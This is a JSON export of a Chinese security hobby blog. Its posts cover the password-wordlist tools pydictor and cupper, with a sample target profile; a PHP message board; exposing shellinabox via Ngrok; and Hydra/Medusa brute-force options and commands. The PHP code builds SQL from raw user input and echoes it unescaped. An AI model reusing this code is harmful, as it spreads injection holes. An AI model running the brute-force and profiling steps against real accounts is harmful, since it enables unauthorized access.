{"meta":{"title":"Emerald Dream","subtitle":null,"description":null,"author":"chessur","url":"https://chirec.github.io","root":"/"},"pages":[],"posts":[{"title":"'生成社工字典'","slug":"Generate-Social-Engineering-Wordlist","date":"2019-03-25T12:10:41.000Z","updated":"2019-03-25T13:41:44.578Z","comments":true,"path":"2019/03/25/Generate-Social-Engineering-Wordlist/","link":"","permalink":"https://chirec.github.io/2019/03/25/Generate-Social-Engineering-Wordlist/","excerpt":"1.工具介绍两款工具都是国人制作，pydictory可以生成各种字典，并且提供的合并字典、比较字典、词频统计等常用功能。cupper根据提供信息生成社工字典，同样包括一些常用功能。cupper作者对自己手中密码库分析和提取，构建了一个神经网络分析密码结构并分类，而且对密码按照权重排序，提高破解效率。 1.1pydictory 你可以用pydictor生成普通爆破字典、基于网站内容的自定义字典、社会工程学字典等等一系列高级字典；你可以使用pydictor的内置工具，对字典进行安全删除、合并、去重、合并并去重、高频词筛选,除此之外，你还可以输入自己的字典，然后使用handler工具，对字典进行各种筛选，编码或加密操作； 你可以通过修改多个配置文件、加入自己的字典、选用leet mode 模式、长度选择、各类字符数量筛选、各类字符种类数筛选、正则表达式筛选，甚至可通过修改/lib/fun/encode.py文件，自定义加密方法等高级操作；按照API编写标准，在/plugins/文件夹下添加自己的插件脚本，在/tools/目录下添加自己的工具脚本等。生成独一无二的高度定制、高效率和复杂字典，生成密码字典的好坏和你的自定义规则、能不能熟练使用pydictor有很大关系； 1.2cupper cupper可以实现的功能如下： 根据目标的信息，生成目标可能使用的密码列表（核心功能） 对各种密码字典进行各式各样的处理，包括检查并删除重复密码、为每一行密码添加新的内容、大小写转换、合并密码字典、分析密码字典、按照一定规则对密码进行排序以提高破解效率 下载作者提供的常用密码字典","text":"1.工具介绍两款工具都是国人制作，pydictory可以生成各种字典，并且提供的合并字典、比较字典、词频统计等常用功能。cupper根据提供信息生成社工字典，同样包括一些常用功能。cupper作者对自己手中密码库分析和提取，构建了一个神经网络分析密码结构并分类，而且对密码按照权重排序，提高破解效率。 1.1pydictory 你可以用pydictor生成普通爆破字典、基于网站内容的自定义字典、社会工程学字典等等一系列高级字典；你可以使用pydictor的内置工具，对字典进行安全删除、合并、去重、合并并去重、高频词筛选,除此之外，你还可以输入自己的字典，然后使用handler工具，对字典进行各种筛选，编码或加密操作； 你可以通过修改多个配置文件、加入自己的字典、选用leet mode 模式、长度选择、各类字符数量筛选、各类字符种类数筛选、正则表达式筛选，甚至可通过修改/lib/fun/encode.py文件，自定义加密方法等高级操作；按照API编写标准，在/plugins/文件夹下添加自己的插件脚本，在/tools/目录下添加自己的工具脚本等。生成独一无二的高度定制、高效率和复杂字典，生成密码字典的好坏和你的自定义规则、能不能熟练使用pydictor有很大关系； 1.2cupper cupper可以实现的功能如下： 根据目标的信息，生成目标可能使用的密码列表（核心功能） 对各种密码字典进行各式各样的处理，包括检查并删除重复密码、为每一行密码添加新的内容、大小写转换、合并密码字典、分析密码字典、按照一定规则对密码进行排序以提高破解效率 下载作者提供的常用密码字典 2.工具下载2.1pydictor1git clone https://github.com/LandGrey/pydictor.git 2.2cupper1git clone https://github.com/ChireC/cupper.git 3.工具使用3.1pydictor3.1.1参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263optional arguments: -h, --help show this help message and exit -base Type Choose from (d, L, c, dL, dc, Lc, dLc) d digital [0 - 9] L lowercase letters [a - z] c capital letters [A - Z] dL Mix d and L [0-9 a-z] dc Mix d and c [0-9 A-Z] Lc Mix L and c [a-z A-Z] dLc Mix d, L and dL [0-9 a-z A-Z] -char character 使用自定义字符集生成字典 -chunk arg [arg ...] 使用排列组合生成字典 -extend arg [arg ...] 拓展字典 //插件生成字典 -plug arg [arg ...] 一段时间内生日生成字典 [begin_date] [end_date], date format: [YYYYMMDD] ftp [keyword1] [keyword2] ... 身份证后4位生成字典 chinese id card last 4 digit 身份证后6位生成字典 chinese id card last 6 digit 身份证后8位生成字典 chinese id card last 8 digit 网页原始关键词生成字典 [url_or_file] --conf [file_path] 使用语法引擎解析字典 --sedb 进入社会工程学字典生成界面 -o path, --output path 设置输入文件位置 -tool arg [arg ...] 字典合并 [dir] 字典比较 [minuend_file] [subtrahend_file] 词频统计 [&apos;v&apos;,&apos;s&apos;,&apos;vs&apos;] [file] [view_num] 字典处理 [file] 多字典文件组合 [file1] [file2] ... 安全擦除字典 [file_or_dir] 合并去重 [dir] 字典去重 [file] --len minlen maxlen 设置生成密码长度 Default: min=0 max=4 --head prefix 为密码开头增加字符 --tail suffix 为密码结尾增加字符 //编码格式 --encode encode b16 base16 encode b32 base32 encode b64 base64 encode des des algorithm and need modify code execjs execute js function and need modify code hmac hmac message digest algorithm md5 md5 message digest algorithm output 32 char md516 md5 message digest algorithm output 16 char none default and don&apos;t encode rsa rsa algorithm and need modify code sha1 sha-1 message digest algorithm sha256 sha-256 message digest algorithm sha512 sha-512 message digest algorithm test custom yourself encode method by modifying function //自定义编码方式 url url encode//出现字母和数字设置范围 --occur letter digital special Default: letter &quot;&lt;=99&quot; digital &quot;&lt;=99&quot; special &quot;&lt;=99&quot; --types letter digital special Default: letter &quot;&gt;=0&quot; digital &quot;&gt;=0&quot; special &quot;&gt;=0&quot; --regex regex Filter by regex, Default: (.*?)//正则表达式过滤 --level code Use code [1-5] to filter results, default: 3 //密码等级 --leet code [code ...] Choose leet mode code (0, 1, 2, 11-19, 21-29) 3.1.2生成社工字典 1234567891011121314151617181920python pydictor.py --sedbset cname liweiset sname lw Lweiset ename zwellset birth 19880916set usedpwd liwei123456. liwei@19880916 lw19880916_123set phone 18852006666set uphone 15500998080set hphone 76500100 61599000 01061599000set email 33125500@qq.comset email 13561207878@163.comset email weiweili@gmail.comset email wei010wei@hotmail.comset postcode 663321 962210set nickname zliliset idcard 152726198809160571set jobnum 20051230 100563set otherdate 19591004 19621012set otherdate 19870906 19880208set usedchar tiger gof gamesthrones 176003 m0n5ter ppdog 3.1.3字典分析由目标信息组合成的各种密码，由于这次填写的信息比较多，所以在字典中没有弱口令，在之前的测试中，并没有填写很多目标信息，导致字典中弱口令很多。 3.1.4使用体验在设置对象信息时，如果出现错误，会直接跳出社会工程字典生成模块，并且再次进入模块不会保存上次填写的信息。 3.2cupper3.2.1参数1234567optional arguments: -h, --help show this help message and exit -f FILE, --file FILE 对密码文件进行各种处理 -i, --interactive 交互式生成密码字典 -s, --session 管理保存输入信息的session文件 -d, --download 下载作者维护的密码字典 -v, --version 查看Logo和显示工具版本 3.2.2生成社工字典 3.2.3使用体验因为是交互式界面，所以很舒服，按照提示填写目标信息即可，要求目标信息非常多，非常详细，而且还可以根据目标对密码的了解程度，以及你生成密码的目的添加信息的信息和参数。如果目标很了解密码，还会生成加密后的密码，如果需要目标社交网络上登陆密码，还要求输入目标站点的名称。 4.参考[1] pydictor-GitHub [2] cupper-GitHub","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'使用PHP编写留言板'","slug":"Create-Message-Board-with-PHP","date":"2019-03-24T07:36:54.000Z","updated":"2019-03-24T13:19:08.425Z","comments":true,"path":"2019/03/24/Create-Message-Board-with-PHP/","link":"","permalink":"https://chirec.github.io/2019/03/24/Create-Message-Board-with-PHP/","excerpt":"PHP留言板结构 1.新建Message类123456789101112131415161718class Message&#123; public $name; public $time; public $content; function __construct($n,$t,$c)&#123; $this-&gt;name=$n; $this-&gt;time=$t; $this-&gt;content=$c; &#125; function show()&#123; echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;; echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;; echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;; &#125;&#125; Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。在创建对象时，构造函数使将值赋给对象的3个属性。show()方法则是显示留言内容。 2.新建MessageBoard类","text":"PHP留言板结构 1.新建Message类123456789101112131415161718class Message&#123; public $name; public $time; public $content; function __construct($n,$t,$c)&#123; $this-&gt;name=$n; $this-&gt;time=$t; $this-&gt;content=$c; &#125; function show()&#123; echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;; echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;; echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;; &#125;&#125; Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。在创建对象时，构造函数使将值赋给对象的3个属性。show()方法则是显示留言内容。 2.新建MessageBoard类 上图左边是MessageBoard类的结构。MessageBoard类包含1个属性，messages。messages的数据类型是数组，其中存放了所有的留言。MessageBoard类包含5个方法，showForm()、saveData()、loadData()、showAllMessages()、showForm()。这5个方法的具体作用写在下面。 2.1显示页面2.1.1showForm()1234567function showForm()&#123; echo &quot;&lt;form action=&apos; &apos; method=&apos;POST&apos;&gt;&quot;; echo &quot;Name: &quot;.&quot;&lt;input type=&apos;text&apos; name=&apos;userName&apos;&gt;&quot;.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.&quot;&lt;input type=&apos;text&apos; name=&apos;content&apos;&gt;&quot;; echo &quot;&lt;input type=&apos;submit&apos;&gt;&quot;; echo &quot;&lt;/form&gt;&quot;; &#125; showForm()方法用于显示留言板的表单，通过echo输出HTML语句标签显示表单，表单提交的方式为POST。 2.1.2showAllMessages()12345function showAllMessages()&#123; foreach($this-&gt;messages as $m)&#123; $m-&gt;show(); &#125; &#125; showAllMessages()方法用于输出留言内容。上面说过messages的数据类型是数组，所以使用foreach()循环输出数组内容，messages中的元素属于Message类，所以使用自身的方法show()来显示留言内容。 2.2留言的接收和读取2.2.1receiveMessage()12345function receiveMessage()&#123; if (count($_POST)!=0)&#123; $this-&gt;saveData($_POST[&apos;userName&apos;],date(&quot;Y-M-D h:i:s&quot;,time()),$_POST[&apos;content&apos;]); &#125; &#125; receiveMessage()方法用于接收留言，如果收到留言则使用saveData()方法将留言存储起来。 2.2.2saveData()12345function saveData($u,$t,$c)&#123; echo &quot;UserName: &quot;.$u.&quot;&lt;br /&gt;&quot;; echo &quot;Time: &quot;.$t.&quot;&lt;br /&gt;&quot;; echo &quot;Content: &quot;.$c.&quot;&lt;br /&gt;&quot;; &#125; 此时的saveData()方法只是用于测试整个留言板是否正常工作，还没有连接数据库，所以无法将数据存储在数据库中。只是将要存储的内容显示在页面上。 2.2.3loadData()123456function loadData()&#123; $temp=new Message(&quot;chessur&quot;,&quot;2019.3.26&quot;,&quot;Hello World!&quot;); array_push($this-&gt;messages,$temp); $temp=new Message(&quot;Andy&quot;,&quot;2019.3.26&quot;,&quot;Hello chessur&quot;); array_push($this-&gt;messages,$temp); &#125; 和saveData()方法一样，此时的loadData()也只是测试阶段。使用$temp存储留言，使用array_push()函数将留言存放在messages数组中。 3.数据库数据库中的数据结构 上图的左边是DB类的结构，database属性和构造函数。具体内容写在下面。上图的右边是数据库中数据表的结构，4个字段：ID、name、time、content，分别表示留言发表顺序、留言者、留言时间、留言内容。 3.1数据库建立&amp;数据表建立使用PHPMyAdmin的图形化界面建立数据库以及数据表 3.1.1数据库建立 3.1.2数据表建立 3.2连接数据库3.2.1创建DB类1234567891011121314151617181920212223242526272829class DB&#123; public $database=null; function __construct()&#123; //connect $dbhost=&quot;localhost&quot;; //127.0.0.1 $account=&quot;root&quot;; $password=&quot;root&quot;; $this-&gt;database=mysql_connect($dbhost,$account,$password); if($this-&gt;database)&#123; echo &quot;DB connected.&quot;; &#125;else &#123; echo &quot;DB connect failed.&quot;; &#125; $result=mysql_select_db(&quot;db_messages&quot;,$this-&gt;database); if($result)&#123; echo &quot;DB select successed.&quot;; &#125;else&#123; echo &quot;DB select failled.&quot;; &#125; &#125; function __destruct()&#123; //disconnect mysql_close($this-&gt;database); &#125;&#125; DB类的两个方法分别是构造函数和析构函数。构造函数在对象实例化时执行，其中包含mySQL数据库的配置信息：IP地址、账户、密码。使用PHP自带的mysql_connect()函数连接mySQL数据库，使用PHP自带的mysql_select_db()函数选择数据库。析构函数在将对象销毁时断开与mySQL数据库的连接，同样适用了PHP自带的mysql_close()函数。 3.2.2MessageBoard继承DB1class MessageBoard extends DB 通过继承DB类，使MessageBoard类可以使用DB类中的方法和属性。 在继承父类后，子类可以使用父类的属性和方法，但是因为子类已经声明了自己的构造函数，所以无法直接继承父类的构造函数，可以使用下面的代码来继承父类的构造函数。 1parent::__construct(); 3.3数据库的读写3.3.1SQL语法1INSERT INTO `all_messages`(`name`,`time`,`content`) VALUE(&apos;chessur&apos;,&apos;2019-3-24&apos;,&apos;Hello World&apos;) 1SELECT * FROM `all_messages`; INSERT INTO是向数据库中插入数据SELECT是从数据库中选择数据 3.3.2saveData()1234function saveData($u,$t,$c)&#123; $query=&quot;INSERT INTO `all_messages`(`name`,`time`,`content`) VALUE(&apos;&quot;.$u.&quot;&apos;,&apos;&quot;.$t.&quot;&apos;,&apos;&quot;.$c.&quot;&apos;)&quot;; mysql_query($query); &#125; 在连接了mySQL数据库后，我们可以将savaData()方法改写为真正的方法，而不再只是测试的作用。mysql_query()函数可以执行一条mySQL语句。 3.3.3loadData()123456789function loadData()&#123; $query=&quot;SELECT * FROM `all_messages`;&quot;; $result=mysql_query($query); while($row=mysql_fetch_array($result))&#123; $temp=new Message($row[&apos;name&apos;],$row[&apos;time&apos;],$row[&apos;content&apos;]); array_push($this-&gt;messages,$temp); &#125; &#125; $query中的mySQL语句是选择表中所有数据，使用mysql_query($query)找到所有数据后，将全部留言放入messages这个数组中，完成留言数据的加载。 4.mysql函数4.1mysql_query()mysql_query() 函数执行一条 MySQL 语句。 1mysql_query(query,connection) 1mysql_query($query) 4.2mysql_connect()mysql_connect() 函数打开非持久的 MySQL 连接。 1mysql_connect(server,user,pwd,newlink,clientflag) 1mysql_open($this-&gt;database) 4.3mysql_select_db()mysql_select_db() 函数设置活动的 MySQL 数据库。如果成功，则该函数返回 true。如果失败，则返回 false。 1mysql_select_db(database,connection) 1mysql_select_db(&quot;db_messages&quot;,$this-&gt;database) 4.4mysql_close()mysql_close() 函数关闭非持久的 MySQL 连接。 1mysql_close(link_identifier) 1mysql_close($this-&gt;database) 4.5mysql_fetch_array()mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有 1mysql_fetch_array(data,array_type) 1mysql_fetch_array($result) 4.6SELECTSELECT 语句用于从数据库中选取数据。 1234SELECT column_name,column_nameFROM table_name;SELECT * FROM table_name; 1SELECT * FROM `all_messages`; 4.7INSERT INTO SELECTINSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个已存在的表中。 1234567INSERT INTO table2SELECT * FROM table1;INSERT INTO table2(column_name(s))SELECT column_name(s)FROM table1; 1INSERT INTO `all_messages`(`name`,`time`,`content`) VALUE(&apos;&quot;.$u.&quot;&apos;,&apos;&quot;.$t.&quot;&apos;,&apos;&quot;.$c.&quot;&apos;) 5.缺陷1.没有删除功能。 2.刷新页面时表单会重复提交。 3.时间显示不正确。 1234567891011121314151617181920212223242526272829303132333435363738/*date()函数参数*/d - 一个月中的第几天（从 01 到 31）D - 星期几的文本表示（用三个字母表示）j - 一个月中的第几天，不带前导零（1 到 31）l（&apos;L&apos; 的小写形式）- 星期几的完整的文本表示N - 星期几的 ISO-8601 数字格式表示（1表示Monday[星期一]，7表示Sunday[星期日]）S - 一个月中的第几天的英语序数后缀（2 个字符：st、nd、rd 或 th。与 j 搭配使用）w - 星期几的数字表示（0 表示 Sunday[星期日]，6 表示 Saturday[星期六]）z - 一年中的第几天（从 0 到 365）W - 用 ISO-8601 数字格式表示一年中的星期数字（每周从 Monday[星期一]开始）F - 月份的完整的文本表示（January[一月份] 到 December[十二月份]）m - 月份的数字表示（从 01 到 12）M - 月份的短文本表示（用三个字母表示）n - 月份的数字表示，不带前导零（1 到 12）t - 给定月份中包含的天数L - 是否是闰年（如果是闰年则为 1，否则为 0）o - ISO-8601 标准下的年份数字Y - 年份的四位数表示y - 年份的两位数表示a - 小写形式表示：am 或 pmA - 大写形式表示：AM 或 PMB - Swatch Internet Time（000 到 999）g - 12 小时制，不带前导零（1 到 12）G - 24 小时制，不带前导零（0 到 23）h - 12 小时制，带前导零（01 到 12）H - 24 小时制，带前导零（00 到 23）i - 分，带前导零（00 到 59）s - 秒，带前导零（00 到 59）u - 微秒（PHP 5.2.2 中新增的）e - 时区标识符（例如：UTC、GMT、Atlantic/Azores）I（i 的大写形式）- 日期是否是在夏令时（如果是夏令时则为 1，否则为 0）O - 格林威治时间（GMT）的差值，单位是小时（实例：+0100）P - 格林威治时间（GMT）的差值，单位是 hours:minutes（PHP 5.1.3 中新增的）T - 时区的简写（实例：EST、MDT）Z - 以秒为单位的时区偏移量。UTC 以西时区的偏移量为负数（-43200 到 50400）c - ISO-8601 标准的日期（例如 2013-05-05T16:34:42+00:00）r - RFC 2822 格式的日期（例如 Fri, 12 Apr 2013 12:01:05 +0200）U - 自 Unix 纪元（January 1 1970 00:00:00 GMT）以来经过的秒数 将上面代码中的h改成H即为24小时 1date(&quot;Y-m-d H:i:s&quot;,time()) 时区设置在php.ini中搜索”timezone”修改 6.参考[1] php留言板製作 [2] PHP 教程 [3] SQL 教程","categories":[],"tags":[]},{"title":"'Kali使用shellinabox，并使用Ngrok将shellinabox映射到外网'","slug":"Kail-Use-Shellinabox&Ngrok","date":"2019-03-21T11:49:19.000Z","updated":"2019-03-25T12:19:28.357Z","comments":true,"path":"2019/03/21/Kail-Use-Shellinabox&Ngrok/","link":"","permalink":"https://chirec.github.io/2019/03/21/Kail-Use-Shellinabox&Ngrok/","excerpt":"1.shellinabox介绍Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统http://IP:4200，在启用了SSL/TLS证书，需要用http://IP:4200来登录。默认情况下shellinabox使用的是4200端口。 2.shellinabox安装使用的是系统是Kali Linux 2019，在终端输入 1apt install shellinabox 如果提示无法找到包，请添加国内更新源 123456789gedit /etc/apt/sources.list//添加下列更新源#清华大学 [更新源]deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙江大学[更新源]deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free","text":"1.shellinabox介绍Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统http://IP:4200，在启用了SSL/TLS证书，需要用http://IP:4200来登录。默认情况下shellinabox使用的是4200端口。 2.shellinabox安装使用的是系统是Kali Linux 2019，在终端输入 1apt install shellinabox 如果提示无法找到包，请添加国内更新源 123456789gedit /etc/apt/sources.list//添加下列更新源#清华大学 [更新源]deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙江大学[更新源]deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free 3.shellinabox参数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859List of command line options: -b, --background[=PIDFILE] run in background -c, --cert=CERTDIR set certificate dir (default: $PWD) --cert-fd=FD set certificate file from fd --css=FILE attach contents to CSS style sheet --cgi[=PORTMIN-PORTMAX] run as CGI -d, --debug enable debug mode -f, --static-file=URL:FILE serve static file from URL path -g, --group=GID switch to this group (default: nogroup) -h, --help print this message --linkify=[none|normal|aggressive] default is &quot;normal&quot; --localhost-only only listen on 127.0.0.1 --no-beep suppress all audio output -n, --numeric do not resolve hostnames -m, --messages-origin=ORIGIN allow iframe message passing from origin --pidfile=PIDFILE publish pid of daemon process -p, --port=PORT select a port (default: 4200) -s, --service=SERVICE define one or more services -t, --disable-ssl disable transparent SSL support --disable-ssl-menu disallow changing transport mode --disable-utmp-logging disable logging to utmp and wtmp -q, --quiet turn off all messages --unixdomain-only=PATH:USER:GROUP:CHMOD listen on unix socket -u, --user=UID switch to this user (default: nobody) --user-css=STYLES defines user-selectable CSS options -v, --verbose enable logging messages --version prints version information --disable-peer-check disable peer check on a sessionDebug, quiet, and verbose are mutually exclusive.One or more --service arguments define services that should be made availablethrough the web interface: SERVICE := &lt;url-path&gt; &apos;:&apos; APP APP := &apos;LOGIN&apos; | &apos;SSH&apos; [ : &lt;host&gt; ] | USER &apos;:&apos; CWD &apos;:&apos; CMD USER := &apos;AUTH&apos; | &lt;username&gt; &apos;:&apos; &lt;groupname&gt; CWD := &apos;HOME&apos; | &lt;dir&gt; CMD := &apos;SHELL&apos; | &lt;cmdline&gt;&lt;cmdline&gt; supports variable expansion: $&#123;columns&#125; - number of columns $&#123;gid&#125; - gid id $&#123;group&#125; - group name $&#123;home&#125; - home directory $&#123;lines&#125; - number of rows $&#123;peer&#125; - name of remote peer $&#123;realip&#125; - value of HTTP header field &apos;X-Real-IP&apos; $&#123;uid&#125; - user id $&#123;url&#125; - the URL that serves the terminal session $&#123;user&#125; - user nameOne or more --user-css arguments define optional user-selectable CSS options.These options show up in the right-click context menu: STYLES := GROUP &#123; &apos;;&apos; GROUP &#125;* GROUP := OPTION &#123; &apos;,&apos; OPTION &#125;* OPTION := &lt;label&gt; &apos;:&apos; [ &apos;-&apos; | &apos;+&apos; ] &lt;css-file&gt;OPTIONs that make up a GROUP are mutually exclusive. But individual GROUPs areindependent of each other. 12345678-b,--background[=PIDFILE] 后台运行-c, --cert=CERTDIR 指定证书目录（默认当前工作路径）-p, --port=PORT 更改端口 (默认: 4200)-t, --disable-ssl 关闭SSL传输-q, --quiet 安静模式，禁用所有信息-u, --user=UID 设置登录用户 (默认: nobody)-v, --verbose 开启登录信息提示--version 显示版本信息 4.shellinabox启动1shellinaboxd -b -t 启动服务之后，在浏览器访问http://IP:4200默认4200端口，可以自己修改shellinabox默认禁止root登陆，所以Kali系统需要新建一个用户登录 5.使用Ngrok将服务映射到外网5.1建立隧道在Ngrok建立隧道，注意本地端口填写启动shellinabox的端口 5.2开启映射123unzip linux_amd64.zipcd /Desktop/linux_amd64./sunny clientid 隧道id 5.3通过外网登陆直接输入URL即可登录","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'Medusa和Hydra对比'","slug":"Brief-Introduction-on-Medusa&Hydra","date":"2019-03-18T11:51:27.000Z","updated":"2019-03-25T12:19:37.821Z","comments":true,"path":"2019/03/18/Brief-Introduction-on-Medusa&Hydra/","link":"","permalink":"https://chirec.github.io/2019/03/18/Brief-Introduction-on-Medusa&Hydra/","excerpt":"1.介绍1.1Hydra Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system. THIS TOOL IS FOR LEGAL PURPOSES ONLY! There are already several login hacker tools available, however, none does either support more than one protocol to attack or support parallized connects. It was tested to compile cleanly on Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS. Currently this tool supports the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP. However the module engine for new services is very easy so it won’t take a long time until even more services are supported. Your help in writing, enhancing or fixing modules is highly appreciated!! :-) 1.2Medusa Medusa is a speedy, parallel, and modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application: Thread-based parallel testing. Brute-force testing can be performed against multiple hosts, users or passwords concurrently. Flexible user input. Target information (host/user/password) can be specified in a variety of ways. For example, each item can be either a single entry or a file containing multiple entries. Additionally, a combination file format allows the user to refine their target listing. Modular design. Each service module exists as an independent .mod file. This means that no modifications are necessary to the core application in order to extend the supported list of services for brute-forcing. Multiple protocols supported. Many services are currently supported (e.g. SMB, HTTP, POP3, MS-SQL, SSHv2, among others). Application stability. Maybe I’m just lame, but Hydra frequently crashed on me. I was no longer confident that Hydra was actually doing what it claimed to be. Rather than fix Hydra, I decided to create my own buggy application which could crash in new and exciting ways.","text":"1.介绍1.1Hydra Number one of the biggest security holes are passwords, as every password security study shows. This tool is a proof of concept code, to give researchers and security consultants the possibility to show how easy it would be to gain unauthorized access from remote to a system. THIS TOOL IS FOR LEGAL PURPOSES ONLY! There are already several login hacker tools available, however, none does either support more than one protocol to attack or support parallized connects. It was tested to compile cleanly on Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS. Currently this tool supports the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP. However the module engine for new services is very easy so it won’t take a long time until even more services are supported. Your help in writing, enhancing or fixing modules is highly appreciated!! :-) 1.2Medusa Medusa is a speedy, parallel, and modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. The author considers following items as some of the key features of this application: Thread-based parallel testing. Brute-force testing can be performed against multiple hosts, users or passwords concurrently. Flexible user input. Target information (host/user/password) can be specified in a variety of ways. For example, each item can be either a single entry or a file containing multiple entries. Additionally, a combination file format allows the user to refine their target listing. Modular design. Each service module exists as an independent .mod file. This means that no modifications are necessary to the core application in order to extend the supported list of services for brute-forcing. Multiple protocols supported. Many services are currently supported (e.g. SMB, HTTP, POP3, MS-SQL, SSHv2, among others). Application stability. Maybe I’m just lame, but Hydra frequently crashed on me. I was no longer confident that Hydra was actually doing what it claimed to be. Rather than fix Hydra, I decided to create my own buggy application which could crash in new and exciting ways. 2.参数介绍2.1Hydra 123456789101112131415161718192021222324252627hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]-R 恢复上一次的会话-I 忽略存在的恢复文件-S SSL连接-s 端口号-l 尝试登陆名-L 从文件中导入登录名-p 尝试密码-P 从文件中导入密码-e nsr n尝试空密码 s尝试与用户名相同的密码 r反向登陆循环-c TIME 设置尝试登陆等待时间-4 / -6 使用IPV4地址或IPV6地址-v / -V 详细信息模式/显示每次尝试的用户名+密码/调试模式-O 使用旧版本SSL v2和v3-q 不显示连接错误信息-h 帮助-M 从文件中导入服务类型-f / -F 在找到第一个账号/密码后，停止破解server 目标IPservice 支持的服务类型支持的服务类型：adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmppExamples：hydra -l user -P passlist.txt ftp://192.168.0.1 hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5 hydra -l admin -p password ftp://[192.168.0.0/24]/ hydra -L logins.txt -P pws.txt -M targets.txt ssh 2.2Medusa 1234567891011121314151617181920212223242526Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]-h [TEXT] 目标IP-H [FILE] 目标主机文件-u [TEXT] 用户名-U [FILE] 用户名文件-p [TEXT] 密码-P [FILE] 密码文件-C [FILE] 组合条目文件-O [FILE] 文件日志信息-e [n/s/ns] N意为空密码，S意为密码与用户名相同-M [TEXT] 模块执行名称-m [TEXT] 传递参数到模块-d 显示所有的模块名称-n [NUM] 使用非默认端口-s 启用SSL-r [NUM] 重试间隔时间，默认为3秒-t [NUM] 设定线程数量-L 并行化，每个用户使用一个线程-f 在找到第一个账号/密码后，停止破解-q 显示模块的使用信息-v [NUM] 